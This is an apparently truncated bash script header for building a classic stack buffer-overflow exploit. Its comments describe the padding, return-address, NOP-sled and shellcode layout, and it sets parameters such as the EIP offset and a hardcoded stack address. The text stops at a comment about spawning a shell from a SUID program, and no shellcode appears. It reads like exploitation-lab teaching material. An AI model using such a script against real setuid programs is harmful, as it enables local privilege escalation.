# bash script to build exploit that jumps to the address determined by the operator.
# Understanding stack operations is crucial to make this work. 
# Example: Under normal conditions, the SP will point to the address immediately after the
# address where the Instruction Pointer (IP) is saved on the stack before calling the
# function. It will also be restored to the same location when completing the called
# function. Knowing this, then putting together the exploit this fashion:
#       padding + desired IP pointing to the NOPsled/shellcode on the stack + NOPsled (if desired) + shellcode
# It can also be done in this way:
#       NOPsled + shellcode + padding to the IP on the stack + address on the desired IP pointing to the NOPsled/shellcode
# will cause the program to execute the shellcode written immediately after the IP.
# If you can't find code that contains an jmpcall esp, then this won't do you any good.
# The size of your shellcode doesn't matter if it is written after the IP. If your NOPsled/shellcode is written before the
# IP, then it must be smaller than the offset to the IP.
# You can tweak this script to control how the full exploit is assembled.


eipoffset=62 # Number of characters to write to buffer before getting to the EIP
lnopsled=16  # Desired length of NOP sled
eiphex='0xffffd5b0' # Desired instruction pointer that jumps to your injected shellcode
numtries=10  # Number of tries to attempt to execute each time incrementing the desired IP by 0x10

# Create a shell, but fails with modern Linux distros as bash doesn't like to be run SUID
